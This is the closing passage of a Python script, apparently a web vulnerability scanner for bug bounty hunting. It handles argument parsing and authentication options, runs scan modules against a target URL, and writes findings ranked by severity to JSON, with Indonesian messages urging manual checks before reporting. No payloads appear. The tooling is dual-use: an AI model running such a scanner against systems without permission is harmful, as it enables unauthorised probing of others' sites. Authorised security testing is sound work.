            opts["proxy"] = args[i + 1]; i += 2
        elif args[i] == "--timeout":
            opts["timeout"] = int(args[i + 1]); i += 2
        elif args[i] == "--threads":
            opts["threads"] = int(args[i + 1]); i += 2
        elif args[i] == "--slow":
            opts["slow"] = True; i += 1
        else:
            i += 1
    if not url.startswith("http"):
        url = "https://" + url
    t0 = time.time()
    print(f"[*] target: {url}")
    print(f"[*] auth: {'cookie' if opts.get('cookie') else ''}{' jwt' if opts.get('jwt') else ''}{' bearer' if opts.get('bearer') else ''}{' (anonymous)' if not any(k in opts for k in ('cookie','jwt','bearer')) else ''}")
    t = T(url, cookie=opts.get("cookie"), jwt=opts.get("jwt"), bearer=opts.get("bearer"),
          proxy=opts.get("proxy"), timeout=opts.get("timeout", 10), slow=opts.get("slow", False))
    modules = opts.get("modules", ALL_MODULES)
    t.run(modules)
    t.findings.sort(key=lambda f: -SEVERITY_RANK[f["severity"]])
    with open(OUT, "w") as f:
        json.dump({"target": url, "generated": time.strftime("%Y-%m-%dT%H:%M:%S"),
                   "findings": t.findings}, f, indent=2, default=str)
    crit = sum(1 for x in t.findings if x["severity"] in ("CRIT", "HIGH"))
    print(f"\n[*] selesai {time.time()-t0:.1f}s — {len(t.findings)} temuan ({crit} HIGH/CRIT) -> {OUT}")
    if t.findings:
        print("[*] verifikasi tiap temuan manual sebelum lapor — 200 OK bukan bukti exploit")
        print("[*] next: python pocgen.py (generate laporan) / python tracker.py (track bounty)")


if __name__ == "__main__":
    main()
